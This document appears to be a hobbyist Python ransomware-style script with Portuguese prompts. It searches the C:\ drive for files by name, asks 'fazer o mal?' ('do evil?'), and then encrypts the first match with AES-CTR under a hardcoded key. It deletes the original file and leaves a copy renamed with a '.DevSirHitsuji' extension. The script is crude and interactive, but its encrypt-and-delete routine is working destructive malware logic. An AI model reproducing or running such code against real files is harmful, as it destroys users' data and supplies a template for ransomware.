import os
import pyaes

diretorio_principal = os.path.dirname(__file__)
file = os.path.join(diretorio_principal, 'importante.txt')
print(file)

chave = b'\x83\xd4V\xf2\x0f\xcd\x06\xf6\xa6\xa6W\xfe\xd1\x0c\x04!'

def criptografar(file_path):
    with open(file_path) as file:
        conteudo = file.read()  # ler um arquivo e guarda seu conteudo na variavel conteudo

        aes = pyaes.AESModeOfOperationCTR(chave)  # objeto pra criptografar
        conteudo_criptografado = aes.encrypt(conteudo)  # criptografado

        new_path = "{}.DevSirHitsuji".format(file_path)

    os.remove(file_path)  # remove a pasta original
    with open(new_path, "wb") as file:
        file.write(conteudo_criptografado)

pasta = 'C:\\'
nome = input('pesquisar arquivo: ')
cont = 0

print('Carregando...')

arquivos_encontrados = []
local_aquivos_encontrado = []
tamanho_dos_arquivos = []

for raiz, diretorios, arquivos in os.walk(pasta):
    for arquivo in arquivos:
        if nome in arquivo:
            local_arquivo = os.path.join(raiz, arquivo)
            arquivos_encontrados.append(arquivo)
            local_aquivos_encontrado.append(local_arquivo)

            tamanho = os.path.getsize(local_arquivo)
            tamanho = tamanho/1000000
            tamanho_dos_arquivos.append(tamanho)

            cont += 1

print(f'{cont} arquivos encontrados no seu sistema!')
print()

for i in range(len(arquivos_encontrados)):
    print(f'ARQUIVO: {arquivos_encontrados[i]}')

nome_preciso = input('\nPesquisa com precisão: ')
print()

for i in range(len(arquivos_encontrados)):
    if nome_preciso in arquivos_encontrados[i]:
        print(f'ARQUIVO: {arquivos_encontrados[i]}')
        print(f'LOCAL: {local_aquivos_encontrado[i]}')
        print('\n', '-='*10, '\n')
print(local_aquivos_encontrado[0])
mal = input('fazer o mal?(S/N)')

if mal == 'S':
    criptografar(local_aquivos_encontrado[0])
    print('mal feito!')

if mal == 'N':
    print('voce é um bom menino!')

